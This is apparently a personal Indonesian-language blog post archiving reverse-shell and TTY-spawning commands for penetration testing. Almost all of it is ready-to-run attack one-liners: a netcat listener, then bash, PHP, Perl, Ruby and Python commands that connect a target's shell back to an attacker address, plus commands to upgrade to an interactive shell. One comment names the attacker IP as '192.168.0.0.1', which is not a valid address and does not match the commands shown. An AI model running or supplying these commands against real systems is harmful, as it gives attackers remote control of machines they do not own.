---
title: "Reverse & Spawning Shell"
date: "2019-01-19"
tags: ['Security']
---

**Reverse & Spawning Shell** - Ini cuma arsip pribadi, gausah dipikir terlalu dalem :) Pilihan kita untuk melakukan reverse shell terbatas pada bahasa pemrograman apa yang terinstall di server target.

## Reverse Shell

Sebelum melakukan reverse shell, pastikan di komputer (attacker) sudah melakukan listening menggunakan netcat.

- Linux > `nc -l 1337`
- Mac > `nc -l localhost -p 1337`

_// `1337` adalah port yang akan dibuka. Bisa diubah sesuai selera._

#### 1\. Reverse Shell dari Bash

Bash dapat digunakan untuk melakukan reverse shell. Dari komputer / server target kita masukkan command berikut :  
`bash -i >& /dev/tcp/**192.168.48.133/1337** 0>&1`  
// _192.168.0.0.1_ adalah IP attacker.  
// _1337_ adalah port yang dibuka sebelumnya di command listening menggunakan netcat.

#### 2\. Reverse Shell dari PHP

Untuk reverse shell dari PHP cukup menggunakan command berikut:  
`php -r '$sock=fsockopen("192.168.48.133",1337);exec("/bin/sh -i <&3 >&3 2>&3");'`Jika gagal, ubah angka file descriptor dari 3 ke 4, 5, atau 6.

#### 3\. Reverse Shell dari Perl

Perl juga bisa digunakan untuk melakukan reverse shell. Dengan menggunakan command:  
```
perl -e 'use Socket;$i="192.168.48.133";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### 4\. Reverse Shell dari Ruby

Ruby juga memungkinkan kita untuk melakukan reverse shell. Command yang perlu digunakan adalah:  
```
ruby -rsocket -e'f=TCPSocket.open("192.168.48.133",1337).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### 5\. Reverse Shell dari Python

Yang terakhir adalah Python, kita perlu menggunakan command:  
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.48.133",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Spawning TTY Shell

Seringkali selama pentest, kita dapat memperoleh shell tanpa tty, namun ingin berinteraksi lebih jauh dengan sistem. Berikut adalah beberapa perintah yang memungkinkan kita memunculkan tty shell. Tentunya sebagian dari ini akan tergantung pada sistem dan _packages_ yang diinstal.

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `perl -e 'exec "/bin/sh";'`
- `perl: exec "/bin/sh";`
- `ruby: exec "/bin/sh"`
- `lua: os.execute('/bin/sh')`

3 teratas adalah yang paling sukses secara umum untuk spawning dari command line.

### Referensi

- [Perintah Back Connect / Reverse Shell di Server Linux](https://www.linuxsec.org/2016/06/reverse-shell-on-linux.html).
- [Spawning TTY Shell](https://netsec.ws/?p=337).
